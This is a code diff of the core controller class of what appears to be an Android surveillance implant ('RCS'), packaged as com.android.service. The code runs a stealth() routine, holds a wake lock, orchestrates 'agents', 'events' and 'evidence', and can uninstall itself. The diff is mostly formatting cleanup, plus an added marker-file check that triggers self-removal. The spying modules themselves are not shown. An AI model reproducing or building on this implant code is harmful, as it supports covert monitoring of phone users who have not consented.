@@ -11,8 +11,6 @@ import android.app.Activity;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.res.Resources;
-import android.os.Handler;
-import android.os.Message;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 
@@ -24,6 +22,7 @@ import com.android.service.auto.Cfg;
 import com.android.service.conf.Configuration;
 import com.android.service.event.EventManager;
 import com.android.service.evidence.Evidence;
+import com.android.service.evidence.Markup;
 import com.android.service.file.AutoFile;
 import com.android.service.file.Path;
 import com.android.service.util.Check;
@@ -57,33 +56,30 @@ public class Core extends Activity implements Runnable {
 	private EventManager eventManager;
 	private WakeLock wl;
 
-/*	private RefreshHandler mRedrawHandler = new RefreshHandler();
-
-	// http://www.tutorialforandroid.com/2009/01/using-handler-in-android.html
-	class RefreshHandler extends Handler {
-
-		@Override
-		public void handleMessage(Message msg) {
-
-			Core.this.updateWake();
-
-		}
-
-		public void sleep(long delayMillis) {
-			this.removeMessages(0);
-
-			sendMessageDelayed(obtainMessage(0), delayMillis);
-
-		}
-
-	};
-
-	void updateWake() {
-		if (Cfg.DEBUG) {
-			Check.log("UPDATEWAKE");
-		}
-		mRedrawHandler.sleep(30000);
-	}*/
+	/*
+	 * private RefreshHandler mRedrawHandler = new RefreshHandler();
+	 * 
+	 * //
+	 * http://www.tutorialforandroid.com/2009/01/using-handler-in-android.html
+	 * class RefreshHandler extends Handler {
+	 * 
+	 * @Override public void handleMessage(Message msg) {
+	 * 
+	 * Core.this.updateWake();
+	 * 
+	 * }
+	 * 
+	 * public void sleep(long delayMillis) { this.removeMessages(0);
+	 * 
+	 * sendMessageDelayed(obtainMessage(0), delayMillis);
+	 * 
+	 * }
+	 * 
+	 * };
+	 * 
+	 * void updateWake() { if (Cfg.DEBUG) { Check.log("UPDATEWAKE"); }
+	 * mRedrawHandler.sleep(30000); }
+	 */
 
 	/**
 	 * Start.
@@ -102,20 +98,21 @@ public class Core extends Activity implements Runnable {
 		resources = r;
 		contentResolver = cr;
 
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.asserts(resources != null, "Null Resources");
+		}
 
 		try {
 			coreThread.start();
-		} catch (Exception e) {
+		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(e);
 			}
 		}
 
-		//mRedrawHandler.sleep(1000);
-		
-		PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
+		// mRedrawHandler.sleep(1000);
+
+		final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
 		wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T");
 		wl.acquire();
 
@@ -131,8 +128,9 @@ public class Core extends Activity implements Runnable {
 	public boolean Stop() {
 		bStopCore = true;
 		stopAll();
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Stopped");
+		}
 		wl.release();
 		return true;
 	}
@@ -144,48 +142,57 @@ public class Core extends Activity implements Runnable {
 	 * @see java.lang.Runnable#run()
 	 */
 	public void run() {
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Started");
+		}
 
 		stealth();
 
 		try {
 			while (!bStopCore) {
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " Info: init task");
-
-				if (taskInit() == false) {
-					if (Cfg.DEBUG)
-						Check.log(TAG + " Error: TaskInit() FAILED");
-					break;
-				} else {
-					if (Cfg.DEBUG)
-						Check.log(TAG + " TaskInit() OK");
-					// CHECK: Status o init?
 				}
 
-				Status.self().setRestarting(false);
-				if (Cfg.DEBUG)
+				if (taskInit() == false) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " Error: TaskInit() FAILED");
+					}
+					break;
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " TaskInit() OK");
+						// CHECK: Status o init?
+					}
+				}
+
+				//Status.self().setRestarting(false);
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " Info: starting checking actions");
+				}
 
 				if (checkActions() == Exit.RELOAD) {
-					if (Cfg.DEBUG)
+					if (Cfg.DEBUG) {
 						Check.log(TAG + " Info: Waiting a while before reloading");
+					}
 					Utils.sleep(2000);
 				} else {
-					if (Cfg.DEBUG)
+					if (Cfg.DEBUG) {
 						Check.log(TAG + " Error: CheckActions() wants to exit");
+					}
 					// chiudere tutti i thread
 					break;
 				}
 			}
 			stopAll();
 		} catch (final Throwable ex) {
-			if (Cfg.DEBUG)
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: run " + ex);
+			}
 		} finally {
-			if (Cfg.DEBUG)
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " AndroidService exit ");
+			}
 			Utils.sleep(1000);
 
 			System.runFinalizersOnExit(true);
@@ -195,20 +202,24 @@ public class Core extends Activity implements Runnable {
 	}
 
 	private void stopAll() {
-		Status status = Status.self();
-		status.setRestarting(true);
-		if (Cfg.DEBUG)
+		final Status status = Status.self();
+		//status.setRestarting(true);
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " Warn: " + "checkActions: reloading");
+		}
 		status.unTriggerAll();
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions: stopping agents");
+		}
 		agentManager.stopAll();
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions: stopping events");
+		}
 		eventManager.stopAll();
 		Utils.sleep(2000);
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions: untrigger all");
+		}
 		status.unTriggerAll();
 
 		final LogDispatcher logDispatcher = LogDispatcher.self();
@@ -228,23 +239,26 @@ public class Core extends Activity implements Runnable {
 
 		try {
 			while (!bStopCore) {
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " checkActions");
+				}
 				final int[] actionIds = status.getTriggeredActions();
 
-				for (int actionId : actionIds) {
+				for (final int actionId : actionIds) {
 					final Action action = status.getAction(actionId);
 					final Exit exitValue = executeAction(action);
 
 					if (exitValue == Exit.UNINSTALL) {
-						if (Cfg.DEBUG)
+						if (Cfg.DEBUG) {
 							Check.log(TAG + " Info: checkActions: Uninstall");
+						}
 						UninstallAction.actualExecute();
 
 						return exitValue;
 					} else if (exitValue == Exit.RELOAD) {
-						if (Cfg.DEBUG)
+						if (Cfg.DEBUG) {
 							Check.log(TAG + " checkActions: want Reload");
+						}
 
 						return exitValue;
 					}
@@ -273,12 +287,19 @@ public class Core extends Activity implements Runnable {
 		try {
 			Path.makeDirs();
 
+			final Markup markup = new Markup(0);
+			if (markup.isMarkup()) {
+				UninstallAction.actualExecute();
+				return false;
+			}
+
 			// Identify the device uniquely
 			final Device device = Device.self();
 
 			if (!loadConf()) {
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: Cannot load conf");
+				}
 				return false;
 			}
 
@@ -290,24 +311,29 @@ public class Core extends Activity implements Runnable {
 
 			// Da qui in poi inizia la concorrenza dei thread
 			if (eventManager.startAll() == false) {
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " eventManager FAILED");
+				}
 				return false;
 			}
 
-			if (Cfg.DEBUG)
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: Events started");
+			}
 
 			if (agentManager.startAll() == false) {
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " agentManager FAILED");
+				}
 				return false;
 			}
 
-			if (Cfg.DEBUG)
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: Agents started");
-			if (Cfg.DEBUG)
+			}
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " Core initialized");
+			}
 			return true;
 
 		} catch (final GeneralException rcse) {
@@ -375,8 +401,9 @@ public class Core extends Activity implements Runnable {
 			// Load the configuration
 			loaded = conf.LoadConfiguration();
 
-			if (Cfg.DEBUG)
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: Resource file loaded: " + loaded);
+			}
 		}
 
 		return loaded;
@@ -391,8 +418,9 @@ public class Core extends Activity implements Runnable {
 
 		// Load the configuration
 		loaded = conf.LoadConfiguration();
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: Conf file loaded: " + loaded);
+		}
 		return loaded;
 	}
 
@@ -413,35 +441,39 @@ public class Core extends Activity implements Runnable {
 	private Exit executeAction(final Action action) {
 		Exit exit = Exit.SUCCESS;
 
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " CheckActions() triggered: " + action);
+		}
 		final Status status = Status.self();
 		status.unTriggerAction(action);
 
 		status.synced = false;
 
 		final int ssize = action.getSubActionsNum();
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions, " + ssize + " subactions");
+		}
 
 		int i = 1;
-		for (SubAction subAction : action.getSubActions()) {
+		for (final SubAction subAction : action.getSubActions()) {
 			try {
 
 				/*
 				 * final boolean ret = subAction.execute(action
 				 * .getTriggeringEvent());
 				 */
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " Info: (CheckActions) executing subaction (" + (i++) + "/" + ssize + ") : "
 							+ action);
+				}
 
 				subAction.prepareExecute();
-				boolean ret = subAction.execute();
+				final boolean ret = subAction.execute();
 
 				if (status.uninstall) {
-					if (Cfg.DEBUG)
+					if (Cfg.DEBUG) {
 						Check.log(TAG + " Warn: (CheckActions): uninstalling");
+					}
 
 					UninstallAction.actualExecute();
 
@@ -451,8 +483,9 @@ public class Core extends Activity implements Runnable {
 				}
 
 				if (status.reload) {
-					if (Cfg.DEBUG)
+					if (Cfg.DEBUG) {
 						Check.log(TAG + " (CheckActions): reloading");
+					}
 					stopAll();
 
 					exit = Exit.RELOAD;
@@ -461,13 +494,15 @@ public class Core extends Activity implements Runnable {
 				}
 
 				if (ret == false) {
-					if (Cfg.DEBUG)
+					if (Cfg.DEBUG) {
 						Check.log(TAG + " Warn: " + "CheckActions() error executing: " + subAction);
+					}
 					continue;
 				}
 			} catch (final Exception ex) {
-				if (Cfg.DEBUG)
+				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: checkActions for: " + ex);
+				}
 			}
 		}
 
